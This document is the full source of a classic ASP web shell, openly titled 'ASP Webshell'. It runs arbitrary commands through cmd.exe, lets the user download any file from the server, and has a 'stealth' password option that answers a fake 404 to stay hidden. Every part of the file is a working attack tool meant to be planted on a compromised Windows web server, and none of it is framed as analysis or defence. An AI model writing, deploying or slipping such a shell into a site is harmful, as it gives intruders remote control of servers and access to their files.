<%@ language="vbscript" %>
<%
Option Explicit

Dim stealthPassword
stealthPassword = ""
If stealthPassword <> "" AND Request.QueryString("pw") <> stealthPassword Then
    Response.Status = "404 Not Found"
    Response.End
End If

Dim downloadFile, downloadMsg, fs, objStream
downloadFile = Request.Form("download-file")
If trim(downloadFile) <> "" Then
    Set fs = Server.CreateObject("Scripting.FileSystemObject")
    Set objStream = Server.CreateObject("ADODB.Stream")
    objStream.Open()
    objStream.type = 1
    On Error Resume Next
    objStream.LoadFromFile(downloadFile)
    If Err.Number <> 0 Then
        objStream.Close()
        downloadMsg = downloadMsg & "Error accessing file <code>" & Server.HTMLEncode(downloadFile) &"</code><br />"
        Err.Clear
    Else
        Response.ContentType = "application/octet-stream"
        Response.AddHeader "Content-Disposition", "attachment; filename=" & fs.GetFileName(downloadFile)
        Response.BinaryWrite(objStream.Read())
        objStream.Close()
        Response.End
    End If
    On Error Goto 0
End If

Dim cmdParam, command, exitCode
cmdParam = Request.Form("cmd")
If trim(cmdParam) <> "" Then
    command = "cmd.exe /c " & cmdParam
End If

sub execute(cmd)
    Dim shell, proc
    Set shell = CreateObject("WScript.Shell")
    Set proc = shell.exec(cmd)
    Response.Write(Server.HTMLEncode(proc.StdOut.ReadAll))
    Response.Write(Server.HTMLEncode(proc.StdErr.ReadAll))
    exitCode = proc.ExitCode
end sub
%>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>ASP Webshell</title>
        <style>
            body {
                font-family: sans-serif;
            }
            input[type=text] {
                font-family: monospace;
            }
            .cmd-box {
                width: 80%;
            }
            .info-line {
                margin: 3px auto;
            }
            .feature-box {
                margin: 1rem auto;
            }
        </style>
    </head>
    <body>
        <form id="form-cmd" method="POST" action="">
            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmd-box" />
            <input type="submit" name="submit-cmd" value="Run" />
        </form>
        <div class="info-line">
<%
If command <> "" Then
    Response.Write("Output of command: <code>" & Server.HTMLEncode(command) & "</code>")
Else
    Response.Write("Run a command to see its output")
End If
%>
        </div>
        <textarea readonly="readonly" rows="25" class="cmd-box">
<%
If command <> "" Then
    call execute(command)
End If
%>
        </textarea>
        <div class="info-line">
<%
If exitCode <> "" Then
    Response.Write("Exit code: <code>" & Server.HTMLEncode(exitCode) & "</code>")
End If
%>
        </div>
        <div class="feature-box">
            <b>File Download</b>
            <div>
<%= downloadMsg %>
            </div>
            <form method="POST" action="">
                <input type="text" name="download-file" placeholder="File to download" />
                <input type="submit" name="submit-download" value="Download" />
            </form>
        </div>
        <script>
            function saveHistory() {
                var cmd = document.getElementById("cmd").value;
                if(cmd.trim() != "" && cmd != shellHistory[shellHistory.length - 1]) {
                    shellHistory.push(cmd);
                }
                sessionStorage.setItem("shellHistory", JSON.stringify(shellHistory));
            }
            function cycleHistory(event) {
                if(event.code == "ArrowUp" && historyPos > 0) {
                    historyPos--;
                    document.getElementById("cmd").value = shellHistory[historyPos];
                } else if(event.code == "ArrowDown" && historyPos < shellHistory.length) {
                    historyPos++;
                    if(historyPos < shellHistory.length) {
                        document.getElementById("cmd").value = shellHistory[historyPos];
                    } else {
                        document.getElementById("cmd").value = "";
                    }
                }
            }
            var shellHistory = JSON.parse(sessionStorage.getItem("shellHistory"));
            if(shellHistory == null) {
                shellHistory = new Array();
            }
            var historyPos = shellHistory.length;
            document.getElementById("form-cmd").addEventListener("submit", saveHistory);
            document.getElementById("cmd").addEventListener("keydown", cycleHistory);
        </script>
    </body>
</html>
